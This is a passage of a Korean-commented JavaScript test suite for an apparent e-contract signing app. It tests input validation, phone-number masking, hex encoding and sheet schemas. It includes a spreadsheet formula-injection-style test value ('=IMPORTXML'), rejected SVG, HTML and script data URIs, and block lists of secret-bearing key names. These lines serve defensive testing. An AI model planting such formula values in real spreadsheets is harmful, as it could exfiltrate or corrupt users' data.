    ok(r.errors.length >= 4, `한 번에 모아야 합니다 — 실제 ${r.errors.length}건`);
    ok(r.errors.some((e) => /제목/.test(e)), '제목 오류가 없습니다');
    ok(r.errors.some((e) => /금액/.test(e)), '금액 오류가 없습니다');
    ok(r.errors.some((e) => /성명/.test(e)), '성명 오류가 없습니다');
    ok(r.errors.some((e) => /휴대폰/.test(e)), '전화번호 오류가 없습니다');
  });

  test('아무것도 안 준 것과 null 을 준 것이 같다', () => {
    deepEq(P.validateCreateInput(null).errors, P.validateCreateInput({}).errors, 'null');
    deepEq(P.validateCreateInput(undefined).errors, P.validateCreateInput({}).errors, 'undefined');
  });

  test('정상 입력은 통과하고 다듬은 값을 함께 준다', () => {
    const r = P.validateCreateInput({
      title: '  둔산동 도배  ',
      amount: '12,000,000원',
      customer: { name: '  홍길동 ', phone: '010-9876-5432' }
    });
    ok(r.ok, `통과해야 합니다 — ${r.errors}`);
    deepEq(r.errors, [], '오류 없음');
    eq(r.title, '둔산동 도배', '제목 앞뒤 공백 정리');
    eq(r.customerName, '홍길동', '성명 앞뒤 공백 정리');
    eq(r.amount, 12000000, '금액 정규화');
  });

  test('금액 경계 — 0원은 막고 100억은 통과, 100억+1원은 막는다', () => {
    no(P.validateCreateInput({ ...GOOD_CREATE, amount: 0 }).ok, '0원');
    no(P.validateCreateInput({ ...GOOD_CREATE, amount: -1 }).ok, '음수');
    ok(P.validateCreateInput({ ...GOOD_CREATE, amount: 1 }).ok, '1원');
    ok(P.validateCreateInput({ ...GOOD_CREATE, amount: 10000000000 }).ok, '정확히 100억');
    no(P.validateCreateInput({ ...GOOD_CREATE, amount: 10000000001 }).ok, '100억 + 1원');
  });

  test('제목·성명 길이 경계', () => {
    ok(P.validateCreateInput({ ...GOOD_CREATE, title: '가'.repeat(120) }).ok, '제목 120자');
    no(P.validateCreateInput({ ...GOOD_CREATE, title: '가'.repeat(121) }).ok, '제목 121자');
    ok(P.validateCreateInput({ ...GOOD_CREATE, customer: { name: '가'.repeat(40), phone: '01098765432' } }).ok, '성명 40자');
    no(P.validateCreateInput({ ...GOOD_CREATE, customer: { name: '가'.repeat(41), phone: '01098765432' } }).ok, '성명 41자');
  });

  test('공백만 있는 제목·성명은 비어 있는 것이다', () => {
    no(P.validateCreateInput({ ...GOOD_CREATE, title: '    ' }).ok, '공백 제목');
    no(P.validateCreateInput({ ...GOOD_CREATE, customer: { name: '  ', phone: '01098765432' } }).ok, '공백 성명');
  });

  test('휴대폰 번호 모양을 가린다', () => {
    const withPhone = (phone) => P.validateCreateInput({ ...GOOD_CREATE, customer: { name: '홍길동', phone } });
    ok(withPhone('010-9876-5432').ok, '하이픈 있는 010');
    ok(withPhone('01098765432').ok, '하이픈 없는 010');
    ok(withPhone('011-123-4567').ok, '옛 011 10자리');
    no(withPhone('02-123-4567').ok, '집전화');
    no(withPhone('012-1234-5678').ok, '없는 앞자리');
    no(withPhone('010-123-456').ok, '9자리 — 자릿수 부족');
    no(withPhone('010-1234-56789').ok, '12자리 — 자릿수 초과');
    no(withPhone('').ok, '빈 값');
    no(withPhone('+82 10-9876-5432').ok, '국가번호 표기는 받지 않는다');
  });

  test('본문은 객체여야 한다 — 문자열로 오면 잡는다', () => {
    ok(P.validateCreateInput({ ...GOOD_CREATE, body: { 조항: [] } }).ok, '객체 본문');
    ok(P.validateCreateInput({ ...GOOD_CREATE, body: null }).ok, '본문 없음');
    no(P.validateCreateInput({ ...GOOD_CREATE, body: '{"a":1}' }).ok, '문자열 본문');
    no(P.validateCreateInput({ ...GOOD_CREATE, body: 3 }).ok, '숫자 본문');
  });

  test('수식처럼 생긴 이름은 검증에서 막지 않는다 — 막는 곳은 시트 쓰기다', () => {
    // 여기서 막으면 "=김"으로 시작하는 정상 상호를 못 쓰게 된다. 방어는 sheetSafe 담당.
    ok(P.validateCreateInput({ ...GOOD_CREATE, title: '=IMPORTXML 공사' }).ok, '수식 모양 제목');
  });

  /* ============================================================
   * 11) 입력 검증 — 서명 제출
   * ============================================================ */
  group('11) 입력 검증 — 서명 제출');

  const PNG = 'data:image/png;base64,' + 'A'.repeat(1400);
  const GOOD_SIGN = { signerName: '홍길동', signatureImage: PNG, agreed: true, docHashSeen: 'a'.repeat(64) };

  test('빈 서명·미동의·지문없음을 한 번에 전부 잡는다', () => {
    const r = P.validateSignInput({});
    no(r.ok, '통과하면 안 됩니다');
    ok(r.errors.some((e) => /성명/.test(e)), '성명');
    ok(r.errors.some((e) => /서명이 비어/.test(e)), '빈 서명');
    ok(r.errors.some((e) => /동의/.test(e)), '미동의');
    ok(r.errors.some((e) => /지문/.test(e)), '지문 없음');
    ok(r.errors.length >= 4, `모아서 돌려줘야 합니다 — 실제 ${r.errors.length}건`);
  });

  test('정상 서명은 통과한다', () => {
    const r = P.validateSignInput(GOOD_SIGN);
    ok(r.ok, `통과해야 합니다 — ${r.errors}`);
    eq(r.signerName, '홍길동', '성명');
  });

  test('빈 캔버스를 제출하면 막는다', () => {
    // 투명 PNG 는 아주 작다. 크기로 "안 그렸다"를 잡는다.
    const tiny = 'data:image/png;base64,' + 'A'.repeat(100);
    const r = P.validateSignInput({ ...GOOD_SIGN, signatureImage: tiny });
    no(r.ok, '작은 이미지가 통과했습니다');
    ok(r.errors.some((e) => /서명이 비어/.test(e)), '빈 서명 안내가 있어야 합니다');
  });

  test('동의는 정확히 true 여야 한다 — 문자열 "true" 로는 안 된다', () => {
    no(P.validateSignInput({ ...GOOD_SIGN, agreed: 'true' }).ok, '문자열 true');
    no(P.validateSignInput({ ...GOOD_SIGN, agreed: 1 }).ok, '숫자 1');
    no(P.validateSignInput({ ...GOOD_SIGN, agreed: false }).ok, 'false');
    no(P.validateSignInput({ ...GOOD_SIGN, agreed: undefined }).ok, '없음');
  });

  test('본 지문이 없으면 서명을 받지 않는다', () => {
    no(P.validateSignInput({ ...GOOD_SIGN, docHashSeen: '' }).ok, '빈 지문');
    no(P.validateSignInput({ ...GOOD_SIGN, docHashSeen: null }).ok, 'null 지문');
  });

  test('PNG data URI 가 아닌 것은 받지 않는다', () => {
    const bad = (img) => P.validateSignInput({ ...GOOD_SIGN, signatureImage: img });
    no(bad('data:image/jpeg;base64,' + 'A'.repeat(1400)).ok, 'JPEG');
    no(bad('data:image/svg+xml;base64,' + 'A'.repeat(1400)).ok, 'SVG — 스크립트를 담을 수 있다');
    no(bad('data:text/html;base64,' + 'A'.repeat(1400)).ok, 'HTML');
    no(bad('https://example.com/sig.png').ok, '주소');
    no(bad('data:image/png;base64,<script>' + 'A'.repeat(1400)).ok, 'base64 아닌 글자가 섞임');
    no(bad('').ok, '빈 값');
  });

  test('너무 큰 서명은 받지 않는다 — 시트·Drive 가 먼저 터진다', () => {
    const huge = 'data:image/png;base64,' + 'A'.repeat(2 * 1024 * 1024 + 100);
    no(P.validateSignInput({ ...GOOD_SIGN, signatureImage: huge }).ok, '2MB 초과');
  });

  test('성명 길이 경계', () => {
    ok(P.validateSignInput({ ...GOOD_SIGN, signerName: '가'.repeat(40) }).ok, '40자');
    no(P.validateSignInput({ ...GOOD_SIGN, signerName: '가'.repeat(41) }).ok, '41자');
    no(P.validateSignInput({ ...GOOD_SIGN, signerName: '   ' }).ok, '공백만');
  });

  /* ============================================================
   * 12) 전화번호 — 원문이 새지 않는가
   * ============================================================ */
  group('12) 전화번호 마스킹');

  const PHONES = ['010-9876-5432', '01098765432', '011-123-4567', '016-234-5678',
                  '010 4321 8765', '010.5555.6666', '01712345678'];

  test('마스킹 결과에 남는 숫자는 앞 3자리와 뒤 4자리뿐이다', () => {
    for (const raw of PHONES) {
      const d = P.normPhone(raw);
      const masked = P.maskPhone(raw);
      eq(P.normPhone(masked), d.slice(0, 3) + d.slice(-4), `${raw} → ${masked}`);
    }
  });

  test('가운데 자리가 결과에 남아 있지 않다', () => {
    for (const raw of PHONES) {
      const d = P.normPhone(raw);
      const middle = d.slice(3, -4);
      const masked = P.maskPhone(raw);
      ok(middle.length > 0, `${raw} — 가운데가 없어 검사가 헛돕니다`);
      no(masked.indexOf(middle) >= 0, `${raw} → ${masked} 에 가운데 ${middle} 가 남아 있습니다`);
    }
  });

  test('마스킹본으로 원문을 되찾을 수 없다 — 서로 다른 번호가 같은 결과로 뭉친다', () => {
    eq(P.maskPhone('010-1111-5432'), P.maskPhone('010-2222-5432'), '가운데만 다른 두 번호');
  });

  test('모양이 이상한 값은 아예 아무것도 흘리지 않는다', () => {
    eq(P.maskPhone('1234567'), '***', '7자리');
    eq(P.maskPhone(''), '***', '빈 값');
    eq(P.maskPhone(null), '***', 'null');
    eq(P.maskPhone('abc'), '***', '글자');
    eq(P.maskPhone('010'), '***', '앞자리만');
  });

  test('8자리 경계에서도 원문이 통째로 남지 않는다', () => {
    // d.length === 8 이면 앞3 + 뒤4 = 7자리라 한 자리는 가려진다.
    const masked = P.maskPhone('01012345');
    eq(masked, '010-****-2345', '8자리');
    no(P.normPhone(masked).indexOf('01012345') >= 0, '원문이 그대로 남았습니다');
  });

  test('숫자만 남긴다', () => {
    eq(P.normPhone('010-9876-5432'), '01098765432', '하이픈');
    eq(P.normPhone(' 010 9876 5432 '), '01098765432', '공백');
    eq(P.normPhone('+82-10-9876-5432'), '821098765432', '국가번호는 그대로 남는다');
    eq(P.normPhone(null), '', 'null');
    eq(P.normPhone(undefined), '', 'undefined');
  });

  test('휴대폰 판정이 집전화·잘못된 자릿수를 거른다', () => {
    ok(P.isValidMobile('01098765432'), '010 11자리');
    ok(P.isValidMobile('0111234567'), '011 10자리');
    ok(P.isValidMobile('01712345678'), '017');
    no(P.isValidMobile('0212345678'), '02 집전화');
    no(P.isValidMobile('0121234567'), '012 없는 앞자리');
    no(P.isValidMobile('0132345678'), '013 없는 앞자리');
    no(P.isValidMobile('010123456'), '9자리');
    no(P.isValidMobile('010123456789'), '12자리');
    // 010 은 요즘 전부 11자리지만, 011~019 와 규칙을 함께 쓰느라 10자리도 통과한다.
    // 느슨한 쪽이지만 해로운 느슨함은 아니다(가짜 번호를 만들어 내지 않는다).
    ok(P.isValidMobile('0101234567'), '[기록] 010 10자리도 통과한다');
    no(P.isValidMobile(''), '빈 값');
    no(P.isValidMobile(null), 'null');
  });

  /* ============================================================
   * 13) 바이트 → 16진수 (해시가 통째로 어긋나는 자리)
   * ============================================================ */
  group('13) 바이트 → 16진수');

  test('두 자리씩 소문자로 낸다', () => {
    eq(P.bytesToHex([0, 15, 16, 255]), '000f10ff', '0·15·16·255');
    eq(P.bytesToHex([]), '', '빈 배열');
    eq(P.bytesToHex([171]), 'ab', '소문자');
  });

  test('음수 바이트를 부호 없이 읽는다 — 여기가 틀리면 해시가 전부 어긋난다', () => {
    // Utilities.computeDigest 는 -128~127 을 준다. & 0xff 를 빠뜨리면 'ffffffb2' 가 된다.
    eq(P.bytesToHex([-1]), 'ff', '-1');
    eq(P.bytesToHex([-78]), 'b2', '-78');
    eq(P.bytesToHex([-128]), '80', '-128');
    eq(P.bytesToHex([127]), '7f', '127');
  });

  test('길이가 언제나 바이트 수의 두 배다', () => {
    const bytes = [];
    for (let i = -128; i < 128; i++) bytes.push(i);
    const hex = P.bytesToHex(bytes);
    eq(hex.length, bytes.length * 2, '길이');
    ok(/^[0-9a-f]+$/.test(hex), '16진수 소문자만 있어야 합니다');
  });

  /* ============================================================
   * 14) 상수 자체의 일관성
   * ============================================================ */
  group('14) 상수 일관성');

  test('상태 이름과 값이 같다 — 오타가 조용히 지나가지 않는다', () => {
    for (const k of Object.keys(P.STATUS)) {
      eq(P.STATUS[k], k, `STATUS.${k}`);
    }
  });

  test('상태 목록이 STATUS 를 빠짐없이 담는다', () => {
    const vals = Object.keys(P.STATUS).map((k) => P.STATUS[k]).sort();
    deepEq(P.ALL_STATUS.slice().sort(), vals, '목록');
    eq(P.ALL_STATUS.length, new Set(P.ALL_STATUS).size, '중복이 있습니다');
  });

  test('되돌릴 수 없는 상태도 상태 목록 안에 있다', () => {
    for (const s of P.TERMINAL_STATUS) {
      ok(P.ALL_STATUS.indexOf(s) >= 0, `${s} 가 상태 목록에 없습니다`);
    }
  });

  /* ============================================================
   * 15) Schema — 열 정의
   * ============================================================ */
  group('15) Schema — 시트 열 정의');

  const ALL_COLS = {
    COLS_CONTRACTS: S.COLS_CONTRACTS,
    COLS_EVENTS: S.COLS_EVENTS,
    COLS_PAYMENTS: S.COLS_PAYMENTS,
    COLS_TOKENS: S.COLS_TOKENS,
    COLS_SETTINGS: S.COLS_SETTINGS
  };

  test('열 이름이 한 시트 안에서 겹치지 않는다', () => {
    // 겹치면 이름으로 찾을 때 앞의 열만 잡혀 뒤의 열은 영영 안 읽힌다.
    for (const [name, cols] of Object.entries(ALL_COLS)) {
      const seen = {};
      for (const c of cols) {
        ok(!seen[c], `${name} 에 같은 열이 두 번 있습니다: ${c}`);
        seen[c] = true;
      }
    }
  });

  test('열 이름이 전부 비어 있지 않은 문자열이다', () => {
    for (const [name, cols] of Object.entries(ALL_COLS)) {
      ok(cols.length > 0, `${name} 이 비어 있습니다`);
      for (const c of cols) {
        eq(typeof c, 'string', `${name} 에 문자열이 아닌 열이 있습니다`);
        ok(c.trim().length > 0, `${name} 에 빈 열 이름이 있습니다`);
        ok(c.charAt(0) !== '_', `${name} 의 ${c} — 밑줄로 시작하면 저장 코드가 건너뜁니다`);
      }
    }
  });

  test('★ 계약 시트에 전화번호 원문 열이 없다', () => {
    // 있으면 그 자체로 실패다. 원문을 남기지 않기로 한 것이 이 설계의 근거다.
    const bad = S.COLS_CONTRACTS.filter((c) => {
      const k = c.toLowerCase();
      const looksPhone = k.indexOf('phone') >= 0 || k.indexOf('tel') >= 0 || k.indexOf('mobile') >= 0;
      if (!looksPhone) return false;
      return !(k.endsWith('masked') || k.endsWith('hash'));
    });
    eq(bad.length, 0, `전화번호 원문으로 보이는 열이 있습니다: ${bad}`);
  });

  test('전화번호를 다루는 열은 마스킹본과 해시 둘 다 있다', () => {
    ok(S.COLS_CONTRACTS.indexOf('customerPhoneMasked') >= 0, '마스킹 열');
    ok(S.COLS_CONTRACTS.indexOf('customerPhoneHash') >= 0, '해시 열');
  });

  test('어떤 시트에도 전화번호·토큰·서명 원문 열이 없다', () => {
    const forbidden = /^(phone|tel|mobile|token|rawtoken|signature|password|secret|pepper)$/;
    for (const [name, cols] of Object.entries(ALL_COLS)) {
      for (const c of cols) {
        no(forbidden.test(c.toLowerCase()), `${name} 에 원문 열이 있습니다: ${c}`);
      }
    }
  });

  test('토큰 시트에는 해시만 있고 원문 열이 없다', () => {
    ok(S.COLS_TOKENS.indexOf('tokenHash') >= 0, 'tokenHash 가 있어야 합니다');
    const bad = S.COLS_TOKENS.filter((c) => /token/i.test(c) && !/hash/i.test(c));
    eq(bad.length, 0, `토큰 원문으로 보이는 열이 있습니다: ${bad}`);
  });

  test('사건 원장에도 원문이 없다 — 해시만 남긴다', () => {
    ok(S.COLS_EVENTS.indexOf('uaHash') >= 0, 'User-Agent 해시');
    ok(S.COLS_EVENTS.indexOf('requestHash') >= 0, '요청 해시');
    const bad = S.COLS_EVENTS.filter((c) => /^(ua|useragent|ip|requestid)$/i.test(c));
    eq(bad.length, 0, `원문 열이 있습니다: ${bad}`);
  });

  test('시트 정의가 5장이고 이름이 겹치지 않는다', () => {
    eq(S.SHEET_DEFS.length, 5, '시트 수');
    const names = S.SHEET_DEFS.map((d) => d.name);
    eq(names.length, new Set(names).size, `시트 이름이 겹칩니다: ${names}`);
    const declared = Object.keys(S.SHEETS).map((k) => S.SHEETS[k]).sort();
    deepEq(names.slice().sort(), declared, 'SHEETS 와 SHEET_DEFS 가 어긋납니다');
  });

  test('시트 정의마다 열 목록이 붙어 있다', () => {
    for (const d of S.SHEET_DEFS) {
      ok(Array.isArray(d.cols), `${d.name} 에 열 목록이 없습니다`);
      ok(d.cols.length > 0, `${d.name} 의 열 목록이 비었습니다`);
    }
  });

  test('사건 이름과 값이 같다 — 오타가 조용히 지나가지 않는다', () => {
    for (const k of Object.keys(S.EVENTS)) {
      eq(S.EVENTS[k], k, `EVENTS.${k}`);
    }
  });

  test('대금 시트에 세 회차를 구분할 열이 있다', () => {
    for (const c of ['contractId', 'stage', 'seq', 'amount']) {
      ok(S.COLS_PAYMENTS.indexOf(c) >= 0, `대금 시트에 ${c} 열이 없습니다`);
    }
  });

  test('대금 시트에 입금 상태 열을 두지 않는다', () => {
    // 열이 살아 있으면 어딘가에서 다시 채우기 시작하고, 그 값이 맞는지 아무도 확인하지 않는다.
    for (const c of ['status', 'invoicedAt', 'paidAt']) {
      ok(S.COLS_PAYMENTS.indexOf(c) < 0, `대금 시트에 ${c} 열이 남아 있습니다`);
    }
  });

  test('계약 시트에 잠금·완료의 증거 열이 있다', () => {
    for (const c of ['docHash', 'bodyJson', 'lockedAt', 'completedAt',
                     'signatureSha256', 'completedSha256', 'completedFileVersion']) {
      ok(S.COLS_CONTRACTS.indexOf(c) >= 0, `계약 시트에 ${c} 열이 없습니다`);
    }
  });

  /* ============================================================
   * 16) Schema — 설정 시트에 비밀값이 들어가지 않는가
   * ============================================================ */
  group('16) Schema — 설정 키 금지어');

  test('TOKEN·SECRET·PEPPER 가 들어간 키를 막는다', () => {
    for (const k of ['ADMIN_TOKEN', 'TOKEN', 'API_SECRET', 'SECRET', 'PEPPER',
                     'SOLAPI_API_KEY', 'PASSWORD', 'PASSWD', 'APIKEY', 'CREDENTIAL']) {
      ok(S.isForbiddenSettingKey(k), `막아야 합니다: ${k}`);
    }
  });

  test('대소문자를 가리지 않는다', () => {
    ok(S.isForbiddenSettingKey('admin_token'), '소문자');
    ok(S.isForbiddenSettingKey('AdminToken'), '섞인 대소문자');
    ok(S.isForbiddenSettingKey('pepper'), '소문자 pepper');
  });

  test('가운데 끼어 있어도 막는다 — 앞뒤만 보지 않는다', () => {
    ok(S.isForbiddenSettingKey('X_TOKEN_Y'), '가운데 TOKEN');
    ok(S.isForbiddenSettingKey('myPepperValue'), '가운데 pepper');
  });

  test('비밀이 아닌 운영값은 통과한다 — 다 막으면 설정 시트를 못 쓴다', () => {
    for (const k of ['WEBAPP_URL', 'SIGN_TTL_HOURS', 'VIEW_TTL_MINUTES',
                     'operatorName', 'noticeText', 'defaultWarrantyMonths']) {
      no(S.isForbiddenSettingKey(k), `막으면 안 됩니다: ${k}`);
    }
  });

  test('[기록] KEY 라는 글자만 들어가도 막는다 — 안전 쪽으로 지나치게 넓다', () => {
    // 'DISPLAY_KEYWORD' 같은 정상 키도 막힌다. 지금은 이 그물을 그대로 둔다 —
    // 설정 시트에 넣을 값이 몇 개 안 되고, 새는 것보다 막히는 편이 낫다.
    // 넓힐 일이 생기면 SETTINGS_FORBIDDEN 을 단어 경계로 바꾸는 편이 낫다.
    ok(S.isForbiddenSettingKey('DISPLAY_KEYWORD'), '지금 동작');
  });

  test('금지어 목록이 전부 대문자다 — 비교가 대문자로 이뤄진다', () => {
    for (const w of S.SETTINGS_FORBIDDEN) {
      eq(w, w.toUpperCase(), `${w} 가 대문자가 아니면 영영 걸리지 않습니다`);
    }
  });

  test('빈 키는 이 함수가 막지 않는다 — 막는 곳은 Code.gs 의 모양 검사다', () => {
    no(S.isForbiddenSettingKey(''), '빈 문자열');
    no(S.isForbiddenSettingKey(null), 'null');
  });
}
